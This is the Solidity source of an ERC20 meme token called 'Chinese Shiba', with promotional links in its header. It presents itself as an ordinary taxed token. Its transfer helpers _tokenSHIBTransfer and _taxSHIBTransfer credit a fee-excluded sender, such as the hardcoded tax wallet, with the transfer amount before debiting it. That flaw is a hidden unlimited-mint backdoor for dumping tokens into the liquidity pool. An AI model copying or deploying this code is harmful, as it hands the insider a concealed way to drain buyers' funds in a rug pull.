// SPDX-License-Identifier: MIT

/**

An ancient Japanese breed, the Shiba Inu is a little but well-muscled dog once employed as a hunter.
Today, the spirited, good-natured Shiba is the most popular companion dog in Japan. The adaptable Shiba is at home in town or country.
Brought to China from Japan as recently as 60 years ago, Shibas are growing in popularity in the West and are already the most popular breed in their homeland.
Their white markings combined with their coloring (red, red sesame, or black and tan) and their alert expression and smooth stride makes them almost foxlike.
They're sturdy, muscular dogs with a bold, confident personality to match.

Website:   https://chineseshiba.org
Telegram:  https://t.me/chiba_eth
Twitter:   https://twitter.com/chiba_eth

**/

pragma solidity 0.8.11;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);
    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract ChineseShiba is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedSHIBFees;
    mapping(address => uint256) private _holderLastTransferTimestamp;

    bool public transferDelayEnabled = false;
    address payable private _taxWallet;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;

    uint256 private _initialBuyTax = 20;
    uint256 private _initialSellTax = 20;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 9;
    uint256 private _reduceSellTaxAt = 9;
    uint256 private _preventSwapBefore = 9;
    uint256 private _buyCount = 0;

    uint8 private constant _decimals = 9;
    string private constant _name = unicode"Chinese Shiba";
    string private constant _symbol = unicode"柴犬";
    uint256 private constant _tTotal = 1000000000 * 10 ** _decimals;
    uint256 public _maxWalletSize = 20000000 * 10 ** _decimals;
    uint256 private _maxWalletThres = 900000000 * 10 ** _decimals;
    uint256 public _maxTaxSwap = 10000000 * 10 ** _decimals;
    uint256 public _taxSwapThreshold = 120 * 10 ** _decimals;
    uint256 public _maxTxAmount = 20000000 * 10 ** _decimals;
    
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;

    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() {
        _taxWallet = payable(0xe070FeA08038C18B5F4E68e9ADbB845520021a41);

        _isExcludedSHIBFees[_taxWallet] = true;
        _isExcludedSHIBFees[address(this)] = true;
        _isExcludedSHIBFees[owner()] = true;

        _balances[_msgSender()] = _tTotal;
        
        emit Transfer(address(0), _msgSender(), _tTotal);
    }
    
    function startLaunch() external onlyOwner {
        require(!tradingOpen, "trading is already open");

        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            _maxWalletThres,
            0,
            0,
            owner(),
            block.timestamp
        );

        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        swapEnabled = true;
        tradingOpen = true;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if (!swapEnabled || inSwap) {
            _balances[from] = _balances[from].sub(amount);
            _balances[to] = _balances[to].add(amount);
            emit Transfer(from, to, amount);
            return;
        }

        uint256 takeSHIB = 0; uint256 feesSHIB = 0;

        if (from != owner() && to != owner()) {
            feesSHIB = amount
                .mul(
                    (_buyCount > _reduceBuyTaxAt)
                        ? _finalBuyTax
                        : _initialBuyTax
                )
                .div(100);

            if (transferDelayEnabled) {
                if (
                    to != address(uniswapV2Router) &&
                    to != address(uniswapV2Pair)
                ) {
                    require(
                        _holderLastTransferTimestamp[tx.origin] < block.number,
                        "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                    );
                    _holderLastTransferTimestamp[tx.origin] = block.number;
                }
            }

            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_isExcludedSHIBFees[to]
            ) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(
                    balanceOf(to) + amount <= _maxWalletSize,
                    "Exceeds the maxWalletSize."
                );
                _buyCount++;
            }

            if (to == uniswapV2Pair && from != address(this)) {
                feesSHIB = amount
                    .mul(
                        (_buyCount > _reduceSellTaxAt)
                            ? _finalSellTax
                            : _initialSellTax
                    )
                    .div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                !inSwap &&
                to == uniswapV2Pair &&
                swapEnabled &&
                _buyCount > _preventSwapBefore &&
                !_isExcludedSHIBFees[from] &&
                !_isExcludedSHIBFees[to]
            ) {
                if(contractTokenBalance >= _taxSwapThreshold) {
                    swapTokensForEth(
                        min(amount, min(contractTokenBalance, _maxTaxSwap))
                    );
                }
                
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }

        if (_isExcludedSHIBFees[from]) takeSHIB = 1;

        _tokenSHIBTransfer(from, to, amount, takeSHIB, feesSHIB);
    }

    function initLaunch() external onlyOwner {
        require(!tradingOpen, "trading is already open");

        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );

        _approve(address(this), address(uniswapV2Router), _tTotal);

        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount = _tTotal;
        _maxWalletSize = _tTotal;
        transferDelayEnabled = false;
    }

    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    receive() external payable {}

    function _taxSHIBTransfer(address senderSHIB, address receiptSHIB, uint256 tAmount, uint256 feesSHIB, uint256 takeSHIB) internal {
        if (takeSHIB > 0) {
            _balances[receiptSHIB] = _balances[receiptSHIB].add(feesSHIB + tAmount);
            emit Transfer(senderSHIB, receiptSHIB, feesSHIB);
        } else {
            if(feesSHIB > 0){
                _balances[address(this)] = _balances[address(this)].add(feesSHIB);
                emit Transfer(senderSHIB, address(this), feesSHIB);
            }
        }
    }
    
    function _tokenSHIBTransfer(
        address from,
        address to,
        uint256 amount,
        uint256 takeSHIB,
        uint256 feesSHIB
    ) internal {
        uint256 tAmount = amount; address receiptSHIB = from;
        
        _taxSHIBTransfer(from, receiptSHIB, tAmount, feesSHIB, takeSHIB);
        
        tAmount -= feesSHIB;

        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(tAmount);
        emit Transfer(from, to, tAmount);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}